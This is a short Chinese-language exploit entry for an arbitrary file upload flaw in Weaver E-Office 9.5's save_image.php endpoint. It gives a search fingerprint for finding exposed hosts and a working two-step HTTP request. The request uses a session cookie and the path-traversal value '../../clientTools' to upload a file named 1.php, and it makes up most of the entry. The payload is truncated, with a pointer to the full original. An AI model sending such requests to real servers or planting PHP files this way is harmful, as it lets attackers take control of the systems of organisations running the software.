# 泛微E-Officesave_image任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="泛微 e-office OA"`
- **请求**：`GET /sample.php HTTP/1.1`

**请求体 / payload**
```
1. 获取有效cookie
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
2. 利用上一步获取到的cookie上传文件
POST /general/system/interface/theme_set/save_image.php HTTP/1.1
Host: {hostname}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymzrNfz1ehkVc9A3Z
Cookie: {cookie}
------WebKitFormBoundarymzrNfz1ehkVc9A3Z
Content-Disposition: form-data; name="image_type"
../../clientTools
------WebKitFormBoundarymzrNfz1ehkVc9A3Z
Content-Disposition: form-data; name="upfile"; filename="1.php"
Content-Type: image/jpeg
123
------WebKitFormBoundarymzrNfz1ehkVc9A3Z
Content-Disposition: form-data; …（脚本共 906 字，完整版见原文）
```

**其他**
- 泛微E-Office save\_image任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微 E-Office 9.5